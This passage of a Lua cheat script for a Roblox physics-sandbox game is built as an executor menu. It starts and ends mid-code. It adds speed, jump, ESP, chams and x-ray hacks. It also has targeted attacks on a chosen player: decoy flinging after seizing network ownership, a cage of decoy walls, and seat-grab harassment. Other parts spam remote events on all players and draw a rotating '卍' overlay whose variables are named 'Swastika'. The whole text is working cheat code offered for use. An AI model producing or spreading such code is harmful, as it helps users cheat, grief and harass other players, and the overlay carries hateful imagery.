                    local Ragdolled = CFP(Parent,"Humanoid") and Parent.Humanoid:FindFirstChild("Ragdolled")
                    local palete = inv:FindFirstChild("RagdollPalete")
                    if not palete then 
                        palete = SpawnToy("PalletLightBrown")
                        if not palete then return end 
                        while not CheckNetworkOwnerOnPart(FWD(palete,"SoundPart")) and task.wait(0.05) do 
                            sno(palete.SoundPart)
                        end
                        for _,v in pairs(palete:GetChildren()) do 
                            if v:IsA("BasePart") then 
                                v.Transparency = 0.8
                                v.CanCollide = false 
                                v.CanQuery = false
                            end
                        end
                        palete.Name = "RagdollPalete"
                        task.delay(1,RenameInShop,palete,"PalletLightBrown","Ragdoll")
                        local bv = Instance.new("BodyVelocity")
                        bv.MaxForce = Vector3.new(0,math.huge,0)
                        bv.Velocity = Vector3.new(0,900,0)
                        bv.Parent = palete.SoundPart
                    end
                    while true do 
                        Ragdolled = CFP(Parent,"Humanoid") and Parent.Humanoid:FindFirstChild("Ragdolled")
                        if not Root or not Ragdolled or not CFP(workspace,"GrabParts") or Ragdolled.Value then 
                            break
                        end
                        palete.SoundPart.Position = Root.Position
                        task.wait(0.1)
                    end 
                end)
            end
            if bool.SpinGrab then 
                local b = Instance.new("BodyAngularVelocity",Parent.PrimaryPart)
                b.AngularVelocity = Vector3.new(0,10,0)
                b.MaxTorque = Vector3.new(0,math.huge,0)
            end
            if bool.MassLessGrab then 
                task.spawn(function()
                    if cons["INFLINE"] then 
                        while CFP(workspace,"GrabParts") and task.wait() do
                            child.DragPart1.AlignPosition.Responsiveness = int.Sense
                            child.DragPart.AlignOrientation.Responsiveness = int.Sense
                            child.DragPart1.AlignPosition.MaxForce = math.huge
                            child.DragPart1.AlignPosition.MaxVelocity = math.huge
                            child.DragPart.AlignOrientation.MaxTorque = math.huge
                        end
                    else 
                        while CFP(workspace,"GrabParts") and task.wait() do
                            child.DragPart.AlignPosition.Responsiveness = int.Sense
                            child.DragPart.AlignOrientation.Responsiveness = int.Sense
                            child.DragPart.AlignPosition.MaxForce = math.huge
                            child.DragPart.AlignPosition.MaxVelocity = math.huge
                            child.DragPart.AlignOrientation.MaxTorque = math.huge
                        end
                    end
                end)
            end
        end
    end)

    GrabTab:AddButton({
        Name = "Return base color",
        Callback = function()
           local args = {
                [1] = ColorSequence.new({
                    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(230, 255, 240)), 
                    ColorSequenceKeypoint.new(0.09, Color3.fromRGB(180, 255, 200)), 
                    ColorSequenceKeypoint.new(0.18, Color3.fromRGB(130, 255, 160)), 
                    ColorSequenceKeypoint.new(0.27, Color3.fromRGB(100, 240, 180)), 
                    ColorSequenceKeypoint.new(0.36, Color3.fromRGB(90, 200, 255)),  
                    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(80, 150, 255)),  
                    ColorSequenceKeypoint.new(0.54, Color3.fromRGB(110, 110, 255)), 
                    ColorSequenceKeypoint.new(0.63, Color3.fromRGB(160, 80, 255)),  
                    ColorSequenceKeypoint.new(0.72, Color3.fromRGB(200, 60, 255)),  
                    ColorSequenceKeypoint.new(0.81, Color3.fromRGB(255, 40, 200)),  
                    ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 30, 80)),   
                    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))        
                })
            }
            SetLineColor:FireServer(unpack(args))
            task.wait() 
        end    
    })
    GrabTab:AddToggle({
        Name = "Crazy Line(Players)",
        Default = false,
        Callback = function(Value)
            bool.CrazyLinePlr = Value 
            while bool.CrazyLinePlr do
                for _,plr in pairs(Players:GetPlayers()) do 
                    local character = plr.Character
                    if character then  
                        local hrp1 = character:FindFirstChild("HumanoidRootPart")
                        if hrp1 then  
                            CreateGrabLine:FireServer(hrp1,hrp1.CFrame * CFrame.new(0,math.random(0,100),0))
                            task.wait(0.15)
                        end
                    end 
                end
            end
        end
    })

    GrabTab:AddSection({
        Name = "c00lLine"
    })
    Toggles["ColorPicker123322231"] = GrabTab:AddSlider({
        Name = "Colors Count",
        Min = 1,
        Max = 20,
        Default = 5,
        Color = Color3.fromRGB(255,255,255),
        Increment = 1,
        ValueName = "colors",
        Save = true,
        Flag = "ColorPicker123322231",
        Callback = function(Value)
            int.sliderValue = Value
        end    
    })

    for i = 1, 20 do
        Toggles["ColorPicker"..i] = GrabTab:AddColorpicker({
            Name = "Colorpicker " .. i,
            Default = Color3.fromRGB(255, 0, 0),
            Save = true,
            Flag = "ColorPicker"..i,
            Callback = function(Value)
                int["Color"..i] = Value
            end   
        })
        int["Color"..i] = Color3.fromRGB(255,0,0)
    end


    Toggles["ApplyColorGrabline"] = GrabTab:AddToggle({
        Name = "ApplyColor",
        Default = false,
        Save = true,
        Flag = "ApplyColorGrabline",
        Callback = function(Value)
            bool.toggleEnabled = Value
            if bool.toggleEnabled then
                task.spawn(function()
                    local keypoints = {}
                    while bool.toggleEnabled and task.wait(1) do
                        keypoints = {}
                        for i = 1, int.sliderValue do
                            local pos = (i-1) / math.max(int.sliderValue-1, 1) 
                            table.insert(keypoints, ColorSequenceKeypoint.new(pos, int["Color"..i]))
                        end
                        SetLineColor:FireServer(ColorSequence.new(keypoints))
                    end
                end)
            end
        end    
    })



    _G.WalkspeedValue = 5 
    function _G.WalkspeedFunc()
        cons:disc("WS")
        if bool.WalkSpeed then
            cons["WS"] = RunService.Stepped:Connect(function()
                if plr and plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChildOfClass('Humanoid') and typeof(_G.WalkspeedValue) == 'number' then
                    h = plr.Character.HumanoidRootPart
                    u = plr.Character:FindFirstChildOfClass('Humanoid')
                    h.CFrame = h.CFrame + u.MoveDirection * ((16 * _G.WalkspeedValue) / 10)
                end
            end)
        end
    end

    Toggles["WalkSpeedValue"] = PlrTab:AddSlider({
        Name = "Walk Speed",
        Min = 1,
        Max = 10,
        Default = 5,
        Color = Color3.fromRGB(51, 204, 51),
        Increment = 1,
        ValueName = "multiplier",
        Save = true,
        Flag = "WalkSpeedValue",
        Callback = function(Value)
            _G.WalkspeedValue = Value
        end    
    })

    Toggles["ApplyWalkSpeed"] = PlrTab:AddToggle({
        Name = "Apply WalkSpeed",
        Default = false,
        Save = true,
        Flag = "ApplyWalkSpeed",
        Callback = function(Value)
            bool.WalkSpeed = Value
            if Value then 
                _G.WalkspeedFunc()
            else 
                cons:disc("WS")
            end
        end
    })
    Toggles["IF"] = PlrTab:AddToggle({
        Name = "Infinity Jump",
        Default = false,
        Save = true,
        Flag = "IF",
        Callback = function(Value)
            if Value then 
                cons["IF"] = game:GetService("UserInputService").JumpRequest:Connect(function()
                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
                end)
            else 
                cons:disc("IF")
            end
        end
    })
    
    -- Jump Power 制御関数（効きやすく修正版）
_G.JumpPowerFunc = function()
    cons:disc("JP")
    
    cons["JP"] = RunService.Heartbeat:Connect(function()
        if bool.JumpPower and hum and hum.Parent then
            local multiplier = _G.JumpPowerValue or 5
            hum.JumpPower = 50 * multiplier
            
            -- より強制的に反映させる
            if hum:GetState() == Enum.HumanoidStateType.Jumping then
                hum.JumpPower = 55 * multiplier
            end
        end
    end)
end

-- ====================== Jump Power ======================
Toggles["JumpPowerValue"] = PlrTab:AddSlider({
    Name = "Jump Power",
    Min = 1,
    Max = 20,
    Default = 5,
    Color = Color3.fromRGB(255, 102, 204),
    Increment = 1,
    ValueName = "multiplier",
    Save = true,
    Flag = "JumpPowerValue",
    Callback = function(Value)
        _G.JumpPowerValue = Value
    end    
})

Toggles["ApplyJumpPower"] = PlrTab:AddToggle({
    Name = "Apply Jump Power",
    Default = false,
    Save = true,
    Flag = "ApplyJumpPower",
    Callback = function(Value)
        bool.JumpPower = Value
        if Value then 
            _G.JumpPowerFunc()
        else 
            cons:disc("JP")
        end
    end
})
    
    Toggles["OceanWalk"] = PlrTab:AddToggle({
        Name = "Ocean Walk",
        Default = false,
        Save = true,
        Flag = "OceanWalk",
        Callback = function(Value)
            for _,v in pairs(workspace.Map.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel:GetChildren()) do  
                if v:IsA("BasePart") then  
                    v.CanCollide = Value
                    v.CanTouch = Value  
                    v.CanQuery = Value
                end
            end
        end
    })


    local ESPConnections = {}

    local function createESP(plr)
        local function onESPCharAdded(char)
            local Head = FWD(char,"Head",3)
            if not head or not bool.ESPEnabled then return end
            local BillboardGUI = Instance.new('BillboardGui')
            BillboardGUI.Adornee = Head
            BillboardGUI.Size = UDim2.new(0, 50, 0, 50)
            BillboardGUI.AlwaysOnTop = true
            BillboardGUI.StudsOffset = Vector3.new(0, 3, 0)
            local ImageLabel = Instance.new('ImageLabel', BillboardGUI)
            ImageLabel.BackgroundTransparency = 1
            ImageLabel.Size = UDim2.new(0, 50, 0, 50)
            ImageLabel.Position = UDim2.new(0.5, -25, 0, 0)
            ImageLabel.Image = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. plr.UserId .. '&width=420&height=420&format=png'
            local TextLabel = Instance.new('TextLabel', BillboardGUI)
            TextLabel.BackgroundTransparency = 1
            TextLabel.Size = UDim2.new(1, 0, 0, 32)
            TextLabel.Position = UDim2.new(0, 0, 1, -32)
            TextLabel.Text = plr.Name .. ' (@' .. plr.DisplayName .. ')'
            TextLabel.TextColor3 = Color3.new(1,1,1)
            TextLabel.TextStrokeTransparency = 0
            BillboardGUI.Parent = Head
        end

        if plr.Character then
            onESPCharAdded(plr.Character)
        end

        local NewPlrCon = plr.CharacterAdded:Connect(onESPCharAdded)
        table.insert(ESPConnections, NewPlrCon)
    end


    local function clearESP()
        for _, conn in ipairs(ESPConnections) do
            conn:Disconnect()
        end
        ESPConnections = {}
        task.wait()
        for _, plr in ipairs(game.Players:GetPlayers()) do
            if plr.Character then
                if plr.Character:FindFirstChild("Head") and plr.Character.Head:FindFirstChild("BillboardGui") then
                    plr.Character.Head["BillboardGui"]:Destroy()
                end
            end
        end
    end
    Toggles["Preserver"] = PlrTab:AddToggle({
        Name = "Preserve House Time",
        Default = false,
        Save = true,
        Flag = "Preserver",
        Callback = function(Value)
            bool.Preserve = Value
            local Plot,PlrInHouse,TimeRemainingNum
            while bool.Preserve and task.wait(0.5) do
                for i = 1,5 do 
                    for _, owner in pairs(workspace.Plots:FindFirstChild("Plot"..i).PlotSign.ThisPlotsOwners:GetChildren()) do
                        if owner.Value == plr.Name then
                            Plot = workspace.Plots:FindFirstChild("Plot"..i)
                            PlrInHouse = owner
                            break 
                        end
                    end
                if PlrInHouse and PlrInHouse.Parent and Plot then Notify("Preserver debug","Found you in "..Plot.Name) break end 
                end
                while bool.Preserve and PlrInHouse and PlrInHouse.Parent and task.wait(0.25) do
                    TimeRemainingNum = PlrInHouse and PlrInHouse.Parent and PlrInHouse:FindFirstChild("TimeRemainingNum")
                    if TimeRemainingNum then
                        if TimeRemainingNum.Value <= 10 then
                            if not bool.inwork then
                                bool.inwork = true  
                                local oldCF = char:GetPivot()
                                char:PivotTo(Plot.PlotArea.CFrame)
                                task.wait(0.35)
                                char:PivotTo(oldCF)
                                bool.inwork = false
                            end
                        end
                    else    
                        break
                    end
                end
            end
        end
    })
    
    PlrTab:AddSection({ Name = "<font color=\"rgb(0, 255, 0)\"><b>Auto Pallet Spawn</b></font>" })
    
PlrTab:AddToggle({
    Name = "Auto Pallet Spawn",
    Default = false,
    Callback = function(Value)
        bool.FallPallet = Value
        if Value then
            task.spawn(function()
                local spawnedThisFall = false
                
                while bool.FallPallet do
                    task.wait(0.05)
                    local char = plr.Character
                    if not char then continue end
                    local hum = char:FindFirstChild("Humanoid")
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if not hum or not hrp then continue end

                    local isFalling = hum.FloorMaterial == Enum.Material.Air and hrp.AssemblyLinearVelocity.Y < -5

                    if isFalling then
                        if not spawnedThisFall then
                            spawnedThisFall = true
                            
                            local pallet = inv:FindFirstChild("PalletLightBrown")
                            if not pallet then
                                pallet = SpawnToy("PalletLightBrown")
                            end
                            if pallet then
                                local part = pallet.PrimaryPart or pallet:FindFirstChildWhichIsA("BasePart")
                                if part then
                                    pcall(function()
                                        sno(part)
                                        part.CFrame = hrp.CFrame * CFrame.new(0, -4, 0)
                                        part.AssemblyLinearVelocity = Vector3.zero
                                    end)
                                end
                            end
                        end
                    else
                        -- 着地したら次の落下でまた1回スポーンできるようにリセット
                        spawnedThisFall = false
                    end
                end
            end)
        end
    end
})
    
PlrTab:AddSection({ Name = "<font color=\"rgb(0, 255, 0)\"><b>FOV•Thirdp</b></font>" })

    Toggles["ThirdP"] = PlrTab:AddToggle({
        Name = "Thirdp",
        Default = false,
        Save = true,
        Flag = "ThirdP",
        Callback = function(Value)
            plr.CameraMaxZoomDistance = 1e9
            if Value then
                plr.CameraMode = "Classic"
            else    
                plr.CameraMode = "LockFirstPerson"
            end 
        end
    })

    Toggles["FOVvalue"] = PlrTab:AddSlider({
        Name = "FOV",
        Min = 10,
        Max = 120,
        Default = 80,
        Color = Color3.fromRGB(255,0,255),
        Increment = 1,
        ValueName = "",
        Save = true,
        Flag = "FOVvalue",
        Callback = function(Value)
            workspace.CurrentCamera.FieldOfView = Value
        end    
    })
    
    
    
    VisualTab:AddSection({Name = "<font color=\"rgb(0, 180, 60)\"><b>rotate</b></font>"})
    
    VisualTab:AddToggle({
    Name = "rotate <💩>",
    Default = false,
    Save = true,
    Flag = "SwastikaRotateTiny",
    Callback = function(Value)
        -- 変数の初期化（初回のみ）
        if not getgenv().SwastikaEnabled then
            getgenv().SwastikaEnabled = false
            getgenv().SwastikaGui = nil
            getgenv().SwastikaConnection = nil
        end

        getgenv().SwastikaEnabled = Value
        
        if Value then
            -- 既存のGUIを削除
            if getgenv().SwastikaGui then 
                getgenv().SwastikaGui:Destroy() 
            end
            
            getgenv().SwastikaGui = Instance.new("ScreenGui")
            getgenv().SwastikaGui.Name = "SwastikaVisual"
            getgenv().SwastikaGui.ResetOnSpawn = false
            getgenv().SwastikaGui.Parent = game:GetService("CoreGui")

            local Frame = Instance.new("Frame")
            Frame.Size = UDim2.new(0, 40, 0, 40)
            Frame.Position = UDim2.new(0.5, -20, 0.5, -20)
            Frame.BackgroundTransparency = 1
            Frame.Parent = getgenv().SwastikaGui

            local Label = Instance.new("TextLabel")
            Label.Size = UDim2.new(1, 0, 1, 0)
            Label.BackgroundTransparency = 1
            Label.Text = "💩"
            Label.TextScaled = true
            Label.Font = Enum.Font.Arcade
            Label.TextStrokeTransparency = 0.4
            Label.Parent = Frame

            local hue = 0
            getgenv().SwastikaConnection = game:GetService("RunService").RenderStepped:Connect(function(dt)
                if not getgenv().SwastikaEnabled then return end
                
                Frame.Rotation = (Frame.Rotation + dt * 42) % 360
                
                hue = (hue + dt * 0.9) % 1
                local color = Color3.fromHSV(hue, 1, 1)
                
                Label.TextColor3 = color
                Label.TextStrokeColor3 = Color3.fromHSV((hue + 0.6) % 1, 1, 1)
            end)

        else
            if getgenv().SwastikaConnection then
                getgenv().SwastikaConnection:Disconnect()
                getgenv().SwastikaConnection = nil
            end
            if getgenv().SwastikaGui then
                getgenv().SwastikaGui:Destroy()
                getgenv().SwastikaGui = nil
            end
        end
    end
})


VisualTab:AddToggle({
    Name = "rotate <卍>",
    Default = false,
    Save = true,
    Flag = "SwastikaRotateTiny",
    Callback = function(Value)
        -- 変数の初期化（初回のみ）
        if not getgenv().SwastikaEnabled then
            getgenv().SwastikaEnabled = false
            getgenv().SwastikaGui = nil
            getgenv().SwastikaConnection = nil
        end

        getgenv().SwastikaEnabled = Value
        
        if Value then
            -- 既存のGUIを削除
            if getgenv().SwastikaGui then 
                getgenv().SwastikaGui:Destroy() 
            end
            
            getgenv().SwastikaGui = Instance.new("ScreenGui")
            getgenv().SwastikaGui.Name = "SwastikaVisual"
            getgenv().SwastikaGui.ResetOnSpawn = false
            getgenv().SwastikaGui.Parent = game:GetService("CoreGui")

            local Frame = Instance.new("Frame")
            Frame.Size = UDim2.new(0, 40, 0, 40)
            Frame.Position = UDim2.new(0.5, -20, 0.5, -20)
            Frame.BackgroundTransparency = 1
            Frame.Parent = getgenv().SwastikaGui

            local Label = Instance.new("TextLabel")
            Label.Size = UDim2.new(1, 0, 1, 0)
            Label.BackgroundTransparency = 1
            Label.Text = "卍"
            Label.TextScaled = true
            Label.Font = Enum.Font.Arcade
            Label.TextStrokeTransparency = 0.4
            Label.Parent = Frame

            local hue = 0
            getgenv().SwastikaConnection = game:GetService("RunService").RenderStepped:Connect(function(dt)
                if not getgenv().SwastikaEnabled then return end
                
                Frame.Rotation = (Frame.Rotation + dt * 42) % 360
                
                hue = (hue + dt * 0.9) % 1
                local color = Color3.fromHSV(hue, 1, 1)
                
                Label.TextColor3 = color
                Label.TextStrokeColor3 = Color3.fromHSV((hue + 0.6) % 1, 1, 1)
            end)

        else
            if getgenv().SwastikaConnection then
                getgenv().SwastikaConnection:Disconnect()
                getgenv().SwastikaConnection = nil
            end
            if getgenv().SwastikaGui then
                getgenv().SwastikaGui:Destroy()
                getgenv().SwastikaGui = nil
            end
        end
    end
})

    VisualTab:AddSection({Name = "<font color=\"rgb(0, 180, 60)\"><b>ESP</b></font>"})

    Toggles["ESP"] = VisualTab:AddToggle({
        Name = "Icon ESP",
        Default = false,
        Save = true,
        Flag = "ESP",
        Callback = function(Value)
            bool.ESPEnabled = Value
            if bool.ESPEnabled then
                for _, plr in ipairs(game.Players:GetPlayers()) do
                    if plr ~= game.Players.LocalPlayer then
                        createESP(plr)
                    end
                end
                cons["NewPlayerCon"] = game.Players.PlayerAdded:Connect(function(plr)
                    if plr ~= game.Players.LocalPlayer then
                        createESP(plr)
                    end
                end)
            else
                clearESP()
                cons:disc("NewPlayerCon")
            end
        end
    })


    Toggles["PCLD_ESP"] = VisualTab:AddToggle({
        Name = "PCLD ESP",
        Default = false,
        Save = true,
        Flag = "PCLD_ESP",
        Callback = function(Value)
            if Value then
                
                for _, v in pairs(workspace:GetChildren()) do
                    AddESP(v)
                end
                
                PCLD_ESP_CON = workspace.ChildAdded:Connect(function(obj)
                    AddESP(obj)
                end)
            else
                
                for _, v in pairs(workspace:GetChildren()) do
                    RemoveESP(v)
                end
                
                if PCLD_ESP_CON then
                    PCLD_ESP_CON:Disconnect()
                    PCLD_ESP_CON = nil
                end
            end
        end
    })

    
    local RainbowChams = false
local RainbowSpeed = 0.5
local RainbowTransparency = 0.5
local Chams = {}

local function AddRainbowChams(plr)
    if plr == game.Players.LocalPlayer then return end
    if not plr.Character then return end

    if Chams[plr] then
        Chams[plr]:Destroy()
    end

    local highlight = Instance.new("Highlight")
    highlight.Name = "RainbowChams"
    highlight.Adornee = plr.Character
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.FillTransparency = RainbowTransparency
    highlight.OutlineTransparency = 1
    highlight.Parent = plr.Character

    Chams[plr] = highlight
end


local function ClearChams()
    for _,v in pairs(Chams) do
        if v then
            v:Destroy()
        end
    end
    Chams = {}
end


Toggles["RainbowChams"] = VisualTab:AddToggle({
    Name = "Rainbow Chams",
    Default = false,
    Save = true,
    Flag = "RainbowChams",

    Callback = function(Value)
        RainbowChams = Value

        if Value then

            for _,plr in pairs(game.Players:GetPlayers()) do
                AddRainbowChams(plr)
            end

            task.spawn(function()
                local lastColor = Color3.fromRGB(255,0,0)

                while RainbowChams do
                    local newColor = Color3.fromHSV(
                        (tick() % 10) / 10,
                        1,
                        1
                    )

                    for i = 0,1,0.05 do
                        if not RainbowChams then break end

                        local color = lastColor:Lerp(newColor,i)

                        for _,h in pairs(Chams) do
                            if h then
                                h.FillColor = color
                                h.FillTransparency = RainbowTransparency
                            end
                        end

                        task.wait(RainbowSpeed / 20)
                    end

                    lastColor = newColor
                end
            end)

        else
            ClearChams()
        end
    end
})


VisualTab:AddSlider({
    Name = "Rainbow Speed",
    Min = 0.1,
    Max = 2,
    Default = 0.5,
    Increment = 0.1,
    Flag = "RainbowSpeed",

    Callback = function(Value)
        RainbowSpeed = Value
    end
})


VisualTab:AddSlider({
    Name = "Chams Transparency",
    Min = 0,
    Max = 1,
    Default = 0.5,
    Increment = 0.05,
    Flag = "ChamsTransparency",

    Callback = function(Value)
        RainbowTransparency = Value
    end
})

local XrayEnabled = false
local XrayTransparency = 0.5
local XrayBackup = {}

local function ApplyXray()
    for _,obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            if not XrayBackup[obj] then
                XrayBackup[obj] = obj.Transparency
            end

            obj.Transparency = XrayTransparency
        end
    end
end

local function RemoveXray()
    for obj,value in pairs(XrayBackup) do
        if obj and obj.Parent then
            obj.Transparency = value
        end
    end

    XrayBackup = {}
end


Toggles["Xray"] = VisualTab:AddToggle({
    Name = "Xray",
    Default = false,
    Save = true,
    Flag = "Xray",

    Callback = function(Value)
        XrayEnabled = Value

        if Value then
            ApplyXray()
        else
            RemoveXray()
        end
    end
})


VisualTab:AddSlider({
    Name = "Xray [Transparency]",
    Min = 0,
    Max = 1,
    Default = 0.5,
    Increment = 0.05,
    Flag = "XrayTransparency",

    Callback = function(Value)
        XrayTransparency = Value

        if XrayEnabled then
            ApplyXray()
        end
    end
})

    Toggles["Time"] = VisualTab:AddSlider({
        Name = "Time",
        Min = 0,
        Max = 24,
        Default = 14,
        Color = Color3.fromRGB(255, 0, 0),
        Increment = 1,
        ValueName = "Hours",
        Save = true,
        Flag = "Time",
        Callback = function(Value)
            Lighting.ClockTime = Value
        end    
    })
    
    local Depth = Instance.new("DepthOfFieldEffect")
    Depth.Parent = Lighting
    Depth.FocusDistance = 0.1
    Toggles["DepthOfField"] = VisualTab:AddSlider({
        Name = "Depth of Field",
        Min = 0,
        Max = 100,
        Default = 0,
        Color = Color3.fromRGB(0, 255, 0),
        Increment = 1,
        ValueName = "Depths",
        Save = true,
        Flag = "DepthOfField",
        Callback = function(Value)
            Depth.FarIntensity = Value * 0.01
        end    
    })
    
    Toggles["FOGS"] = VisualTab:AddSlider({
        Name = "FOG Intensity",
        Min = 0,
        Max = 100,
        Default = 0,
        Color = Color3.fromRGB(0, 0, 255),
        Increment = 1,
        ValueName = "FOGS",
        Save = true,
        Flag = "FOGS",
        Callback = function(Value)
            Lighting.FogEnd = (10000 - Value * 100)
        end    
    })
    
    Toggles["FOGcolor"] = VisualTab:AddColorpicker({
        Name = "FOG color",
        Default = Color3.fromRGB(192, 192, 192),
        Save = true,
        Flag = "FOGcolor",
        Callback = function(Value)
            Lighting.FogColor = Value
        end	  
    })

    Toggles["Ambientcolor"] = VisualTab:AddColorpicker({
        Name = "Ambient color",
        Default = Color3.fromRGB(120, 120, 120),
        Save = true,
        Flag = "Ambientcolor",
        Callback = function(Value)
            Lighting.FogColor = Value
        end	  
    })

    local ColorCol = Instance.new("ColorCorrectionEffect",Lighting)
    Toggles["Brigtness"] = VisualTab:AddSlider({
        Name = "Brigtness",
        Min = -100,
        Max = 100,
        Default = 0,
        Color = Color3.fromRGB(255, 0, 0),
        Increment = 1,
        ValueName = "Brights",
        Save = true,
        Flag = "",
        Callback = function(Value)
            ColorCol.Brightness = Value * 0.01
        end    
    })
    Toggles["Contrast"] = VisualTab:AddSlider({
        Name = "Contrast",
        Min = -100,
        Max = 100,
        Default = 0,
        Color = Color3.fromRGB(0, 255, 0),
        Increment = 1,
        ValueName = "Contrast",
        Save = true,
        Flag = "",
        Callback = function(Value)
            ColorCol.Contrast = Value * 0.01
        end    
    })
    Toggles["Saturation"] = VisualTab:AddSlider({
        Name = "Saturation",
        Min = -100,
        Max = 100,
        Default = 0,
        Color = Color3.fromRGB(0, 0, 255),
        Increment = 1,
        ValueName = "",
        Save = true,
        Flag = "Saturation",
        Callback = function(Value)
            ColorCol.Saturation = Value * 0.01
        end    
    })
    local Bloom = Instance.new("BloomEffect")
    Bloom.Parent = Lighting
    Bloom.Threshold = 0.9

    Toggles["BloomIntensity"] = VisualTab:AddSlider({
        Name = "Bloom Intensity",
        Min = 0,
        Max = 100,
        Default = 0,
        Color = Color3.fromRGB(255, 255, 0),
        Increment = 1,
        ValueName = "Intens",
        Save = true,
        Flag = "BloomIntensity",
        Callback = function(Value)
            Bloom.Intensity = Value * 0.05 
        end
    })

    local options, playerMap = BuildPlayerOptions()
    local selectedPlrName = nil 
    local Dropdown1 = TarTab:AddDropdown({
        Name = "Target",
        Default = "",
        Options = options,
        Callback = function(Value)
            local chosenPlayer = playerMap[Value]
            selectedPlrName = chosenPlayer and chosenPlayer.Name or nil
        end
    })
    
    TarTab:AddTextbox({
        Name = "Target NAME",
        Default = "",
        TextDisappear = true,
        Callback = function(Value)
            if Value == "" then return end
            Value = Value:lower()

            for _, plr1 in pairs(game.Players:GetPlayers()) do
                local nameMatch = string.sub(plr1.Name:lower(), 1, #Value) == Value
                local displayMatch = string.sub(plr1.DisplayName:lower(), 1, #Value) == Value

                if nameMatch or displayMatch then
                    local displayString = string.format(
                        '<font color="rgb(255,0,0)"><b>%s</b></font> <b><i>(%s)</i></b>',
                        plr1.Name,
                        plr1.DisplayName
                    )
                    selectedPlrName = plr1.Name
                    Dropdown1:Set(displayString)
                    break 
                end
            end
        end   
    })
    
    TarTab:AddButton({
    Name = "Decoy Fling",
    Callback = function()
        -- 既存のデコイを削除
        for _, v in ipairs(workspace:GetChildren()) do
            if v.Name == "FLINGDECOY" then
                pcall(function() DestroyToy:FireServer(v) end)
            end
        end
        for _, v in ipairs(inv:GetChildren()) do
            if v.Name == "FLINGDECOY" then
                pcall(function() DestroyToy:FireServer(v) end)
            end
        end

        local target = game.Players:FindFirstChild(selectedPlrName)
        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
            warn("ターゲットが見つかりません")
            return
        end

        local decoy = SpawnToy("YouDecoy")
        if not decoy then
            warn("デコイの生成に失敗")
            return
        end

        decoy.Name = "FLINGDECOY"

        local root = decoy:WaitForChild("HumanoidRootPart", 5)
        if not root then
            pcall(function() DestroyToy:FireServer(decoy) end)
            return
        end

        -- 所有権確保
        for i = 1, 30 do
            sno(root)
            task.wait(0.03)
        end

        -- フリング処理（短時間）
        task.spawn(function()
            local start = tick()
            while decoy.Parent and (tick() - start < 8) do
                local targetHRP = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                if targetHRP and root.Parent then
                    root.CFrame = targetHRP.CFrame * CFrame.new(math.random(-6,6), math.random(1,5), math.random(-6,6))

                    root.AssemblyLinearVelocity = Vector3.new(
                        math.random(-160,160),
                        math.random(250, 400),
                        math.random(-160,160)
                    )

                    root.AssemblyAngularVelocity = Vector3.new(
                        math.random(-900,900)*60,
                        math.random(-900,900)*60,
                        math.random(-900,900)*60
                    )
                end
                task.wait()
            end

            -- 終了後に削除
            if decoy and decoy.Parent then
                pcall(function() DestroyToy:FireServer(decoy) end)
            end
        end)

    end
})

TarTab:AddButton({
    Name = "Decoy Wall",
    Callback = function()
        -- 既存の壁デコイを全削除
        for _, v in ipairs(workspace:GetChildren()) do
            if v.Name == "WALLDECOY" then
                pcall(function() DestroyToy:FireServer(v) end)
            end
        end
        for _, v in ipairs(inv:GetChildren()) do
            if v.Name == "WALLDECOY" then
                pcall(function() DestroyToy:FireServer(v) end)
            end
        end

        local target = game.Players:FindFirstChild(selectedPlrName)
        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
            warn("ターゲットが見つかりません")
            return
        end

        local targetHRP = target.Character.HumanoidRootPart
        local positions = {
            Vector3.new(4.5, 0, 0), Vector3.new(-4.5, 0, 0),
            Vector3.new(0, 0, 4.5), Vector3.new(0, 0, -4.5),
            Vector3.new(4.5, 0, 4.5), Vector3.new(4.5, 0, -4.5),
            Vector3.new(-4.5, 0, 4.5), Vector3.new(-4.5, 0, -4.5),
            Vector3.new(0, 5.5, 0), Vector3.new(0, -3, 0)
        }

        for _, offset in ipairs(positions) do
            local decoy = SpawnToy("YouDecoy")
            if not decoy then continue end

            decoy.Name = "WALLDECOY"

            task.spawn(function()
                local root = decoy:WaitForChild("HumanoidRootPart", 3)
                if not root then 
                    pcall(function() DestroyToy:FireServer(decoy) end)
                    return 
                end

                -- 所有権確保
                for _ = 1, 28 do
                    sno(root)
                    task.wait(0.035)
                end

                -- 物理強化
                for _, part in pairs(decoy:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                        part.CustomPhysicalProperties = PhysicalProperties.new(8, 0.1, 0.5)
                    end
                end

                -- 一定時間だけ壁として維持
                local startTime = tick()
                while decoy.Parent and (tick() - startTime < 12) do  -- 12秒間維持
                    if targetHRP.Parent then
                        root.CFrame = targetHRP.CFrame * CFrame.new(offset)
                        root.AssemblyLinearVelocity = Vector3.new(0, 12, 0)
                        root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                    end
                    task.wait(0.1)
                end

                -- 時間終了後に削除
                if decoy and decoy.Parent then
                    pcall(function() DestroyToy:FireServer(decoy) end)
                end
            end)

            task.wait(0.12) -- 生成間隔
        end
    end
})

TarTab:AddSection({ Name = "Don`t Give chance to seat on blob" })

    TarTab:AddToggle({
        Name = "Don`t Give chance to seat on blob",
        Default = false,
        Callback = function(Value)
            bool.AntiBlobGrab = Value
            while bool.AntiBlobGrab do
                task.wait(0.1)
                if not Players[selectedPlrName] or not Players[selectedPlrName].Character or not Players[selectedPlrName].Character.Humanoid then continue end 
                if Players[selectedPlrName].Character.Humanoid.SeatPart ~= nil then 
                    local oldCF = hrp.CFrame
                    task.wait(0.1) 
                    hrp.CFrame = Players[selectedPlrName].Character.HumanoidRootPart.CFrame * CFrame.new(0,5,5)
                    task.wait(0.2) 
                    sno(Players[selectedPlrName].Character.Head)
                    hrp.CFrame = oldCF
                    task.wait(0.5)
                end
            end
        end    
    })
TarTab:AddButton({
    Name = "Check For Friend Here",
    Callback = function()
